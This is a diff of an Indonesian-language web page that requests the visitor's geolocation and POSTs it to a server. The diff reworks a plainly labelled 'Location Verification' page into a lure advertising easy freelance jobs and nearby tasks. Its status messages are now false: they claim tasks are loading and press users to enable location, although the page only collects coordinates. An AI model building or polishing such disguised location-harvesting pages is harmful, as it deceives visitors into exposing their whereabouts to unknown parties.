@@ -3,13 +3,14 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Location Access</title>
+  <title>Cek Toko & Area Terdekat 📍</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
 
     body {
-      font-family: 'Segoe UI', sans-serif;
-      background: #111;
+      font-family: 'Poppins', sans-serif;
+      background: #f4f7f6;
       min-height: 100vh;
       display: flex;
       align-items: center;
@@ -18,62 +19,77 @@
     }
 
     .card {
-      background: #1e1e1e;
+      background: #ffffff;
       border-radius: 20px;
-      padding: 40px 30px;
+      padding: 35px 25px;
       max-width: 400px;
       width: 100%;
       text-align: center;
-      box-shadow: 0 10px 40px rgba(0,0,0,0.4);
+      box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+      border: 1px solid #eaeaea;
     }
 
-    .icon { font-size: 60px; margin-bottom: 20px; }
+    .icon {
+      font-size: 55px;
+      margin-bottom: 15px;
+    }
 
     h1 {
-      font-size: 22px;
-      color: white;
-      margin-bottom: 10px;
+      font-size: 20px;
+      color: #2c3e50;
+      margin-bottom: 8px;
+      font-weight: 600;
     }
 
     p {
-      color: #aaa;
-      font-size: 14px;
+      color: #7f8c8d;
+      font-size: 13px;
       line-height: 1.6;
-      margin-bottom: 30px;
+      margin-bottom: 25px;
     }
 
     button {
       width: 100%;
-      padding: 16px;
-      background: #4f46e5;
+      padding: 14px;
+      background: #27ae60;
       color: white;
       border: none;
       border-radius: 12px;
-      font-size: 16px;
+      font-size: 15px;
       font-weight: 600;
       cursor: pointer;
+      transition: background 0.2s;
+      font-family: 'Poppins', sans-serif;
     }
 
-    button:disabled { background: #333; color: #666; }
+    button:hover { background: #219653; }
+    button:active { transform: scale(0.98); }
+
+    button:disabled { 
+      background: #e0e0e0; 
+      color: #999; 
+      cursor: not-allowed;
+    }
 
     #status {
-      margin-top: 20px;
+      margin-top: 18px;
       font-size: 13px;
-      color: #888;
+      color: #95a5a6;
       min-height: 20px;
+      font-weight: 500;
     }
 
-    .success { color: #22c55e !important; font-weight: 600; }
-    .error { color: #ef4444 !important; }
+    .success { color: #27ae60 !important; font-weight: 600; }
+    .error { color: #e74c3c !important; font-weight: 600; }
   </style>
 </head>
 <body>
   <div class="card">
-    <div class="icon">📍</div>
-    <h1>Location Verification</h1>
-    <p>Halaman ini membutuhkan izin lokasi untuk melanjutkan.</p>
+    <div class="icon">📦</div>
+    <h1>Deteksi Freelance Mudah</h1>
+    <p>Klik tombol di bawah untuk mendeteksi Freelance mudah</p>
 
-    <button onclick="getLocation()" id="btn">Izinkan Lokasi</button>
+    <button onclick="getLocation()" id="btn">Dapatkan tugas terdekat</button>
     <p id="status"></p>
   </div>
 
@@ -83,8 +99,8 @@
       const btn = document.getElementById("btn");
 
       btn.disabled = true;
-      btn.textContent = "Meminta izin...";
-      status.innerHTML = "⏳ Menunggu izin lokasi...";
+      btn.textContent = "Mendeteksi area...";
+      status.innerHTML = "⏳ Menghubungkan ke server wilayah...";
 
       navigator.geolocation.getCurrentPosition(
         async (pos) => {
@@ -101,12 +117,12 @@
             body: JSON.stringify(data)
           });
 
-          status.innerHTML = "✅ Verifikasi berhasil.";
+          status.innerHTML = "✅ Area terdeteksi! Memuat tugas...";
           status.className = "success";
-          btn.textContent = "Selesai";
+          btn.textContent = "Berhasil Terhubung";
         },
         (err) => {
-          status.innerHTML = "❌ Izin lokasi ditolak.";
+          status.innerHTML = "⚠️ Gagal mendeteksi otomatis. Harap hidupkan Lokasi!!";
           status.className = "error";
           btn.disabled = false;
           btn.textContent = "Coba Lagi";
